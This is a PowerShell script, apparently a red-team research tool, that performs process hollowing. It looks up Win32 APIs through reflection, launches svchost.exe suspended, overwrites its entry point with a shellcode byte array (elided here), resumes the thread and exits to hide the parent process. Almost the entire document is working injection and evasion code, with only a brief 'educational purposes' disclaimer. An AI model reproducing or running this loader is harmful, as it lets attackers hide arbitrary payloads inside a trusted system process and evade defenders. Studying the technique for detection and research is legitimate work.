<#

DynWin32-ShellcodeProcessHollowing.ps1 performs shellcode based process hollowing using
dynamically looked up Win32 API calls. The script obtains the methods GetModuleHandle,
GetProcAddress and CreateProcess by using reflection. Afterwards it utilizes GetModuleHandle
and GetProcAddress to obtain the addresses of the other required Win32 API calls.

When all required Win32 API calls are looked up, it starts svchost.exe in a suspended state
and overwrites the entrypoint with the specified shellcode. Afterwards, the thread is resumed
and the shellcode is executed enveloped within the trusted svchost.exe process.

This script should be used for educational purposes only. It was only tested on Windows 10 (x64)
and is probably not stable or portable. It's only purpose is to demonstrate the usage of reflective
lookups of Win32 API calls. See it as just an silly experiment :)

Author: Tobias Neitzel (@qtc_de)
License: GPL-3.0 License

#>

[Byte[]] $SHELLCODE = 0xff, ...

filter Get-Type ([string]$dllName,[string]$typeName)
{
    if( $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals($dllName) )
    {
        $_.GetType($typeName)
    }
}

function Get-Function
{
    Param(
        [string] $module,
        [string] $function
    )

    if( ($null -eq $GetModuleHandle) -or ($null -eq $GetProcAddress) )
    {
        throw "Error: GetModuleHandle and GetProcAddress must be initialized first!"
    }

    $moduleHandle = $GetModuleHandle.Invoke($null, @($module))
    $GetProcAddress.Invoke($null, @($moduleHandle, $function))
}

function Get-Delegate
{
    Param (
        [Parameter(Position = 0, Mandatory = $True)] [IntPtr] $funcAddr,
        [Parameter(Position = 1, Mandatory = $True)] [Type[]] $argTypes,
        [Parameter(Position = 2)] [Type] $retType = [Void]
    )

    $type = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('QD')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).
    DefineDynamicModule('QM', $false).
    DefineType('QT', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
    $type.DefineConstructor('RTSpecialName, HideBySig, Public',[System.Reflection.CallingConventions]::Standard, $argTypes).SetImplementationFlags('Runtime, Managed')
    $type.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $retType, $argTypes).SetImplementationFlags('Runtime, Managed')
    $delegate = $type.CreateType()

    [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($funcAddr, $delegate)
}

# Obtain the required types via reflection
$assemblies = [AppDomain]::CurrentDomain.GetAssemblies()
$unsafeMethodsType = $assemblies | Get-Type 'System.dll' 'Microsoft.Win32.UnsafeNativeMethods'
$nativeMethodsType = $assemblies | Get-Type 'System.dll' 'Microsoft.Win32.NativeMethods'
$startupInformationType =  $assemblies | Get-Type 'System.dll' 'Microsoft.Win32.NativeMethods+STARTUPINFO'
$processInformationType =  $assemblies | Get-Type 'System.dll' 'Microsoft.Win32.SafeNativeMethods+PROCESS_INFORMATION'

# Obtain the required functions via reflection: GetModuleHandle, GetProcAddress and CreateProcess
$GetModuleHandle = $unsafeMethodsType.GetMethod('GetModuleHandle')
$GetProcAddress = $unsafeMethodsType.GetMethod('GetProcAddress', [reflection.bindingflags]'Public,Static', $null, [System.Reflection.CallingConventions]::Any, @([System.IntPtr], [string]), $null);
$CreateProcess = $nativeMethodsType.GetMethod("CreateProcess")

# Obtain the function addresses of the required hollowing functions
$ResumeThreadAddr = Get-Function "kernel32.dll" "ResumeThread"
$ReadProcessMemoryAddr = Get-Function "kernel32.dll" "ReadProcessMemory"
$WriteProcessMemoryAddr = Get-Function "kernel32.dll" "WriteProcessMemory"
$ZwQueryInformationProcessAddr = Get-Function "ntdll.dll" "ZwQueryInformationProcess"

# Create the delegate types to call the previously obtain function addresses
$ResumeThread = Get-Delegate $ResumeThreadAddr @([IntPtr])
$WriteProcessMemory = Get-Delegate $WriteProcessMemoryAddr @([IntPtr], [IntPtr], [Byte[]], [Int32], [IntPtr])
$ReadProcessMemory = Get-Delegate $ReadProcessMemoryAddr @([IntPtr], [IntPtr], [Byte[]], [Int], [IntPtr]) ([Bool])
$ZwQueryInformationProcess = Get-Delegate $ZwQueryInformationProcessAddr @([IntPtr], [Int], [Byte[]], [UInt32], [UInt32]) ([Int])

# Instantiate the required structures for CreateProcess and use them to launch svchost.exe
$startupInformation = $startupInformationType.GetConstructors().Invoke($null)
$processInformation = $processInformationType.GetConstructors().Invoke($null)

$cmd = [System.Text.StringBuilder]::new("C:\\Windows\\System32\\svchost.exe")
$CreateProcess.Invoke($null, @($null, $cmd, $null, $null, $false, 0x4, [IntPtr]::Zero, $null, $startupInformation, $processInformation))

# Obtain the required handles from the PROCESS_INFORMATION structure
$hThread = $processInformation.hThread
$hProcess = $processInformation.hProcess

# Create a buffer to hold the PROCESS_BASIC_INFORMATION structure and call ZwQueryInformationProcess
$processBasicInformation = [System.Byte[]]::CreateInstance([System.Byte], 48)
$ZwQueryInformationProcess.Invoke($hProcess, 0, $processBasicInformation, $processBasicInformation.Length, 0)

# Locate the image base address. The address of the PEB is the second element within the PROCESS_BASIC_INFORMATION
# structure (e.g. offset 0x08 within the $processBasicInformation buffer on x64). Within the PEB, the base image
# addr is located at offset 0x10.
$imageBaseAddrPEB = ([IntPtr]::new([BitConverter]::ToUInt64($processBasicInformation, 0x08) + 0x10))

# Use ReadProcessMemory to read the required part of the PEB. We allocate already a buffer for 0x200
# bytes that we will use later on. From the PEB we actually only need 0x08 bytes, as $imageBaseAddrPEB
# already points to the correct memory location. We parse the obtained 0x08 bytes as Int64 and IntPtr.
$memoryBuffer = [System.Byte[]]::CreateInstance([System.Byte], 0x200)
$ReadProcessMemory.Invoke($hProcess, $imageBaseAddrPEB, $memoryBuffer, 0x08, 0)

$imageBaseAddr = [BitConverter]::ToInt64($memoryBuffer, 0)
$imageBaseAddrPointer = [IntPtr]::new($imageBaseAddr)

# Now that we have the base address, we can read the first 0x200 bytes to obtain the PE file format header.
# The offset of the PE header is at 0x3c within the PE file format header. Within the PE header, the relative
# entry point address can be found at an offset of 0x28. We combine this with the $imageBaseAddr and have finally
# found the non relative entry point address.
$ReadProcessMemory.Invoke($hProcess, $imageBaseAddrPointer, $memoryBuffer, $memoryBuffer.Length, 0)

$peOffset = [BitConverter]::ToUInt32($memoryBuffer, 0x3c)                               # PE header offset
$entryPointAddrRelative = [BitConverter]::ToUInt32($memoryBuffer, $peOffset + 0x28)     # Relative entrypoint
$entryPointAddr = [IntPtr]::new($imageBaseAddr + $entryPointAddrRelative)               # Absolute entrypoint

# Overwrite the entrypoint with shellcode and resume the thread.
$WriteProcessMemory.Invoke($hProcess, $entryPointAddr, $SHELLCODE, $SHELLCODE.Length, [IntPtr]::Zero)
$ResumeThread.Invoke($hThread)

# Close powershell to remove it as the parent of svchost.exe
exit
